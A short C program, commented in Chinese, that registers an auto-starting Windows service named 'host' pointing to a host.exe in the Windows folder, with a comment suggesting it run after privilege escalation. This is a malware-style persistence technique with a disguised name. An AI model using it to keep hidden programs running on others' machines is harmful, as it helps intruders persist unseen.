// windows服务注册需要管理员权限，可以提权后或者弹框申请管理员权限运行后再执行注册服务功能

#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <wincrypt.h>
#include <shlobj.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

void CreateServiceToRunAtStartup() {
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (schSCManager == NULL) {
        return;
    }

    char path[MAX_PATH];
    SHGetSpecialFolderPath(NULL, path, CSIDL_WINDOWS, FALSE);
    strcat(path, "\\host.exe");

    SC_HANDLE schService = CreateService(
        schSCManager, 
        "host", 
        "host", 
        SERVICE_ALL_ACCESS, 
        SERVICE_WIN32_OWN_PROCESS, 
        SERVICE_AUTO_START, 
        SERVICE_ERROR_NORMAL, 
        path, 
        NULL, NULL, NULL, NULL, NULL);

    if (schService == NULL) {
        CloseServiceHandle(schSCManager);
        return;
    }

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

int main(int argc, char *argv[]) {
  CreateServiceToRunAtStartup(); //会将当前程序注册一个名叫host.exe的windows服务，并且开机自启动
}